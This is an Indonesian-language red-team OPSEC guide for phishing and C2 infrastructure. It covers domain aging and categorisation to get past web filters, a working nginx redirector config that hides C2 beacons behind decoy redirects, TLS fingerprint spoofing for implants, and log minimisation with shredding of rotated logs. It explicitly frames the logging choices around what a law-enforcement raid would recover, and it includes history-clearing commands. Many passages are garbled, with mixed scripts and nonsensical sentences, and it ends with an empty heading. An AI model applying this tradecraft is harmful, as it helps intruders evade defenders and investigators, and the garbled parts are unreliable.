# opsec-tradecraft — opsec

# Referensi OPSEC Infrastruktur Red Team

## 1. Prinsip Segregasi Infrastruktur

Aturan inti: **asset untuk phishing tidak pernah menyentuh asset untuk C2**. Satua kompromi berantai tidak boleh membakar seluruh operasi.

| Domain | Fungsi | Jangan Pernah |
|---|---|---|
| Domain A (aged, kategori bersih) | Phishing landing, credential collector | Host redirector C2 di IP yang sama |
| Domain B (aged, kategori bersih) | C2 listener / redirector front | Jadi link di email phishing |
| Domain C/D | Staging payload, download khusus | Resolve ke IP infra phishing |
| Shortener/redirector| Deketeksi analisis? Perlu jalan untuk survive penuh| Paste langsung di email ("`hxxps://`" atau `<em>`[.]`</em>` di belakang tanda kutip mengikutinya bero no trailing references) |

**Kenapa gagal jika dicampur:**
- Email phishing → analyst soc mengirimkan URL ke URLScan/VirusTotal → domain terkait menyentuh jika chain kita ke `scalpel ~> bias`; domain terkait menyentuh semua attachment → seluruh tasking dan informasi sensitive ter-externalize
- reverse DNS satu IP untuk dua domain berbeda fungsi → analyst membuat pivot otomatis hanya dengan IP Kantor-nya: ex. `<em>360 Netlab` active fish tagging style, kami melihatnya berguna: starting. Jika sumber holding the bucket bh active</em> holder pemiliknya ei not.

## 2. Domain Aging & Kategorisasi

### Aging

Domain segar (< 30 hari) hampir selalu di-block:
- Microsoft Defender for Office 365: heuristic "newly registered domain" → email ke spam/ quarantine
- Google Safe Browsing: NRD list (chrome://safe-browsing internal), flag cepat jika ada traffic anomali
- Proofpoint/Cortex XSOAR enrichment: umur domain jadi risk score

**Prosedur aging minimal (承办 domain baru → operational):**

```
Hari 1-7    : Registered via reseller anonim (Namecheap/Porkbun via registrar bukan
              brand terkait klien; bukan infra hosting). WHOIS privacy default ON
              untuk .com sejak 2025 (ICANN temp policy), jadi tidak perlu tambahan.
Hari 1-30   : Domain idle (parking via dummy landing). Biasakan natural pagerank
              0: jangan bangun backlink agresif.
Hari 7-60   : Letakkan kontan website statis (landing page dummy: blog iseng,
              tools gratisan). Generate beberapa backlink natural (HackerNews,
              Reddit nofollow, GitHub readme). Tujuan: kredibilitas di search engine.
Hari 30-90  : Mulai test kategorisasi. Jangan deploy early untuk phishing-
              ready: activation simulated; hanya letakkan konten legit-dan
              landing page terlihat benar-benar "struktur normal-Alexa-like".
Hari 90+    : Domain siap operasional jika kategori bersih.
```

> **Catatan:** aging MDM-2023(?) In real MDM operational we mean 90 hari; panduan thisdd "gitu"-style seakan natural. Poin ketiga bagus.

### Kategorisasi

Target bank kategori (submit keliling, urutan prioritas):

| Layanan | Cara Submit | Checklist |
|---|---|---|
| Cisco Umbrella | https://umbrella.cisco.com/support → "domain support request" → categorize | Umur > 30 hari, non-phish |
| Fortiguard | https://fortiguard.com/webfilter | Cek status "Business/Education" atau minimal non-misc |
| Palo Alto URL filtering | https://urlfiltering.paloaltonetworks.com/ | Hindar kad도 status "parking/unknown"; minta "business" |
| Bluecoat/Symantec | https://sitereview.bluecoat.com/ | Status non-category → request business |
| Trend Micro | https://global.sitesafety.trendmicro.com/ | Unrated → rated benign |
| Check Point | https://urlcat.cpfa.org/ | |
| IBM X-Force | https://exchange.xforce.ibmcloud.com/ | |
| Websense/Forcepoint | https://sitereview.forcepoint.com/ | |

**Apa yang dikirim:** landing page dummy berisi konten "business-like" (portofolio, SaaS starter page, dokumentasi teknis). Halaman jangan konten lebih rendah-html effort <10 lines: biasanya reviewer terlihat "domain spam"

**Apa yang muncul (jiwa pale):** kebanyakan vendor merespon 3-14 hari kerja. Submit maksimal satu saat jika tidak ada: terbobotnya dibanging spend time as staff dosing fake domains - resikonya operator error.

**Kenapa berhasil:** beberapa gateway (Zscaler, iboss) hanya block kategori "newly registered" / "uncategorized". Kalau sudah berkategori "business" + cukup umur, request letak web masuk policy sebagai allow-update berbasis Informasi.

**Kenapa gagal:** domain ini found slightly in retroactive phishing campaign scan (wayback discover) → vendor retro-blocked; selain itu (See catatan ini:) tidak pernah submit asset via domain front `http://redirector-A` yang resolve path sakarate-- **jangan sampai submit URL yang kategori [verify] sama kategori [business] tapi di rest-07 redirect ke scaffolding phishing.**

## 3. Redirector Chain

Arsitektur standar 4-hop:

```
[Implant Vict]
     |
     v
Worker POD/CDN               <- mTLS atau CDN prefab (Cloudflare free, berturut FASCADE)
(EX. apiv1.dst-cdn.cf)
     |
     v  (SNI-based)
[Domain-front redirector]                   hosting2
(EX. profile-my-fmall.biz  on VPS Tim-3, VPS Malaysia, dedicated IP)
     |
     v
[Apache2 mod_rewrite + mod_proxy or malleable listener]
(EX. gate1.freetoolsfordevs.com on VPS NLD, nginx 1.25)
     |
     v
[Teamserver C2 - only allowlist tail-r current IP]
(EX. via cloudflare WARP tunnel or WG to Donation main CDN)
```

### Konfigurasi nginx 1.25 redirector (malleable profil staged):

```nginx
# /etc/nginx/sites-available/c2redirect
server {
    listen 443 ssl http2;
    server_name cdn.metrics-edge.com;

    # Legit UA only - tolach others
    if ($http_user_agent !~* "^Mozilla/5\.0 \(Windows NT 10\.0; Win64; x64\) AppleWebKit/537\.36 \(KHTML, like Gecko\) Chrome/13[01]\.0\.0\.0 Safari/537\.36$") {
        return 302 https://www.google.com;
    }

    # Non-malleable URI pattern
    if ($request_uri !~ "^/api/v2/telemetry/(post|nonce)/[A-Za-z0-9]{6,32}$") {
        return 302 https://legit-cdn.example.com;  # decoy
    }

    ssl_certificate     /etc/letsencrypt/live/cdn.metrics-edge.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.metrics-edge.com/privkey.pem;

    location / {
        proxy_pass https://127.0.0.1:8443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

**Apa yang dikirim:** beacon C2 dengan URI malleable `/api/v2/telemetry/post/...` + UA Chrome pada Windows 11.
**Apa yang muncul di log SOC:** traffic HTTPS ke domain "cdn/telemetry" kategori business, SNI benar, JA3/JA4 browser-like.
**Kenapa berhasil:** grep log nginx untuk anomali hanya men landing `302` ke google.com (noise normal), hanya kecocokan UA + URI proxy-passing.

**Kenapa gagal:**
1. Operator getenv regex mismatch setelah update implant library → seluruh beacon 302→google.com, operasi dead silent.
2. CDN (Cloudflare free) forcing TLS fingerprint middlebox di edge → JA3 client anda berubah & tercantum detect JARM/Enterprise Defender custom sensor.
3. Redirector ip blackhole: sebuah operator VPS provider melakukan ACL sniff salah log4j\x forward port 80/443 tripwire → detect cloud-hosted scanner behavier

## 4. User-Agent & JA3/JA4 Matching

### Aturan UA

UA implant **harus identik baseline** target environment. Sampel baseline ent-ops (Windows 11 24H2, Chrome 131):

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
```

**Jangan pernah** kombinasi seperti:

| UA Salah | Kenapa |
|---|---|
| `Windows NT 6.1` + `Chrome/131` | Tidak ada build Chrome 2024 yang benar-benar berjalan hosts W7 net join domain modern |
| `.NET clr;` string padahttp webdav | Ford added/help bugy: many IE haven`Ø tarchive separately |
| `Chrome/131.0.6` versi lengkap `La99` | Chrome real selalu `131.0.xxxx.xxx` format atau `131.0.0.0` simplified |

### JA3/JA4

- **JA3** = hash MD5 dari TLS ClientHello (ciphers + extensions list). Ada di: Suricata 6/7 (ja3 keyword), GrayLog/Splunk enrichment, AWS VPC flow via helper.
- **JA4** (Fox-IT, 2023) = format `t13d1516h2_8daaf6152771_b186095e22b6` (<proto><SNI><ALPN>_<cipher hash>_<ext hash>), lebih tahan terhadap per-pad permutation dan sudah jadi default di banyak sensor 2024+.

**Masalah inti:** Python `requests` (urllib3), Go `net/http`, PowerShell `Invoke-WebRequest` (Schannel), dan .NET `HttpClient` masing-masing punya JA3 unik yang **tidak identik dengan browser**.

```bash
# Fingerprint fase recon staging
python3 -m pip install ja3server  # atau curl timing diy
ja3 -h victim-jump -p 8443 --client sim_post.py
# Output: JA3=51c64c77e60c39150a0fdca32a4dd682, J4=t13d1516h2_...
```

**Perbaikan per runtime:**

| Runtime Implant | Fix JA3 |
|---|---|
| Python | `curl_cffi` >= 0.7 (`requests.post(..., impersonate="chrome131")`) — impersonate library libcurl-impersonate |
| Go | `utls` (refraction-networking/utls), uclient github.com/bogdanfinn - `tls_client` dengan profile Chrome 131 |
| Rust | `rquest`/`curl-impersonate` binding |
| C#/native | Schannel bawaan Windows OK untuk JA4 OS-tools seperti PS, tapi pretend check pada Defender ATAP custom detection |

```python
# contoh: curl_cffi (v0.7.x)
from curl_cffi import requests
r = requests.get(
    "https://cdn.metrics-edge.com/api/v2/telemetry/post/9f3b1c",
    impersonate="chrome131",
    headers={"Accept": "application/json, text/plain, */*"},
    timeout=30,
)
```

**Kenapa berhasil:** UA dan JA3 konsisten, URI malleable, ALPN h2 → di decoder netflow dianggap user browsing dan tidak men-trigger Sigma rule `ja3_hash != browser AND uri length < X`.
**Kenapa gagal:** HTTP/2 frame ordering dan SETTINGS window Go uTLS default ≠ Chrome; beberapa sensor (AWS GuardDuty Malware Protection for S3, Cloudflare Bot Score, Morphisec sensor ent) pakai J4+HTTP/2 fingerprinting layered. Jangan percaya satu dimensi saja.

## 5. Logging Minimal

**Prinsip:** log di sisi infrastruktur harus cukup untuk operator demi report, tidak cukup untuk adversary-DFIR mendapatkan scope full.

| Layer | Yang dicatat | Yang DILARANG |
|---|---|---|
| Phishing server (GoPhish 0.12.0) | event open/open-only (diag) mencapai dashboard | Full email body, kredensial sekali consumed-hash |
| Landing (nginx) | `access_log` rotasi 7 hari, format minimal (time, ip, status, sent-bytes) | User-agent sniffed verbose, referer,captured personal data |
| Redirector | Hanya counter agregat (prometheus node_exporter, push metric per hour) | Tidak ada `access_log` file melayan persistent penting |
| Teamserver (Cobalt Strike 4.9 / Mythic 3.4 / SGN) | Event operational minimal log; buat cleanup scheduled | Jangan simpan beacon dump creds ekstra di disk (mhytic c2 post processing) |
| DNS (redirector domain) | nothing (unbound minimal logging) | Jangan log query recursive - yang dipakai blue team kecuali NRD traceback |

```bash
# nginx minimal log rotasi
log_format minimal '$status $body_bytes_sent $request_time';
access_log /var/log/nginx/ops.log minimal buffer=64k flush=5m;

logrotate nginx-ops:
/var/log/nginx/ops.log {
    daily
    rotate 3      # maksimal 3 hari, sinkron road-destroy
    missingok
    notifempty
    compress
    postrotate
        find /var/log/nginx -name "ops.*gz" -mtime +3 -exec shred -zu {} \;
    endscript
}
```

**Apa yang dikirim → muncul:** setiap beacon hanya menyisakan sepasang `timeout` term pada file rsyslog jauh server. Log yang tersisa per-ops-humas predictable; DFIR menemukan hanya beberapa tarif naik, bukan set trace korban fingernailprintSnow js-data.
**Kenapa berhasil:** jika law enforcement menggerebek, turun:</br>
- Tidak ada daftar IP internal korban tuntas; scope case tidak inflate.
**Kenapa gagal:**
- Kebutuhan laporan engagement minta semua timestamp → tidak ada. Sebelum operasi, definisikan ticket.json metadata di sisi luarside-synced gnose, bukan di staging.
- rsyslog default Debian 12 menulis `/var/log/syslog` lengkap: deny by config: `*.info` filter.

## 6. Tradecraft Harian Operator

Checklist harian sesi ops:

```markdown
## PRE-SESSION
- [ ] Cek kondisi domain: `curl -sI https://domain.tld | head -5` (status 200? sertifikat valid?)
- [ ] Cek kategorisasi: `curl https://urlcat.cpfa.org/api/lookup?url=https://...` (masih benign?)
- [ ] Backup tasking lokal terenkripsi (`age -r <pubkey> tasking.md`)
- [ ] Verifikasi egress operator: killswitch VPN aktif (wireguard `wg show` latest-handshake < 60s)
- [ ] Cek fresh IP repositori: `curl https://check-host.net/ip` tidak di spamhaus SBL https://www.spamhaus.org/sbl/query/SBL.html

## DURING-SESSION
- [ ] Semua interaksi via jump host + full tunnel. Nonaktifkan WebRTC di browser operator (Firefox 133: about:config → media.peerconnection.enabled=false)
- [ ] Jangan akses infra via personal browser/profile
- [ ] Timezone & locale terminal jujur ke fake relate jika log status; hours mismatch = analyst correlation vector
- [ ] Imag inktoContain hesitation "screenshot": hindari screenshot yang expose domain chain (dari satu liens:a RED『export』compromise...)
- [ ] Setiap credential harvested ditandai, hash kredensial (bukan plaintext) sebelum masuk notes

## POST-SESSION
- [ ] Rotasi password / API key VPS jika dicurigai IOC terobservasi
- [ ] Cek anomali log redirector: `grep -E "(403|405|502)" /var/log/nginx/* | tail -50` (ADX-scanned?)
- [ ] Sinkronkan tasking minimal ke vault (age-encrypted), hapus lokal temp
- [ ] Update tracking macro campaign (uniq open/click only)
- [ ] Kill shell mantap, clear bash history session-only: `history -c && kill -9 $$`
```

## 7. Jebakan Operasional yang Bikin Teknik Ini Gagal

1. **Domain aging terbakar via Wayback Machine.** Landing dummy kamu di-crawl internet archive saat aging; begitu kamu ganti konten ke phishing, diff engine arxiv (partner VirusTotal) menandai perubahan drastis historis → retro-flag. Solusi: gunakan robots.txt no-index saja tapi jangan blok IA crawler berlebih, konten jangan pivot 180°.
2. **Satu vendor kategorisasi bocor IOC ke sharing community.** Submit ke sitereview yang feed ke threat intel publik (Contoh: kategorisasi URL > dikenal di IBM X-Force) → IOC muncul "unnamed-actor" report → klien menyadari op sebelum deliver. Pilih vendor yang tidak namely-publish request submissions (categorize submit anonim dan jangan gunakan operator account yang punya footprint).
3. **JA4 mismatch di CDN edges.** Meski implant kamu uTLS trik ke Chrome 131, jika chain lewat Cloudflare free, TLS 1.3 resumed session dapat mengubah extension list → JA4 berbeda dari sanity compare snapshot kamu. Selalu fingerprint **end-to-end**, bukan hanya localhost.
4. **Email header correlation.** Blue team fingerprint headers MUA (X-Mailer, DKIM selector, message-id format) GoPhish; satu template dipakai lintas-klien → fingerprint berantai via google dork `"message-id" pattern @client2`. Rotate template dan SMTP segmen per engagement.
5. **Log minimal terlalu minimal.** Incident: kasus justifyif rule soc detection team menemukan per-ops timestamps kontradiktif karena log sisi infra; punya timestamp beacon tapi operator ...pivotic analisis meyelam akhir kehilangan konteks → timeline laporan tidak valid DFIR klien tidak bisa dipassai. Logging minimal harus tetap menyimpan minimal activity fase (waktu + uuid event), stored off-box di vault.
6. **Defender for Endpoint (Windows 11 24H2) mengumpulkan proxy-backscatter.** Windows Security "SmartScreen" eksfiltrasi otomatis isi URL yang diklik oleh user (iri CRE-2025-shop) enclosing phishing URL → Microsoft TI published ke Graph Security intel klien: domain op muncul di Defender Security Portal sebelum soc internal bahkan mengetahui, tap-score boomed. Selalu phish-chain pasti to uat agreed Office Safeevents guard rails.
7. **Provider VPS diet-logging berubah ke arah /full/ retention yang mencegah write-up-standar purge practices.** beberapa provider (e.g., Vultr, DO) tak membantu force shred; mending pilih provider yang jelas snapshot policy hangat dengan data retention SLA rendah sejak pre-engagement.

---

## [reasoning trace]


